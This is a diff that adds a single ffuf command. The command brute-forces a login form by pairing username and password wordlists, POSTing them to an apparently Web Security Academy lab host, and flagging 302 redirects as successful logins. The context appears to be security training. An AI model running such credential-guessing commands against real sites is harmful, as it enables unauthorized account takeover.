@@ -1,0 +1,6 @@
+ffuf -w username.txt:USER -w password.txt:PASS \
+  -u https://0a8d004b0351f95f8150a21400ed0092.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=USER&password=PASS" \
+  -mc 302
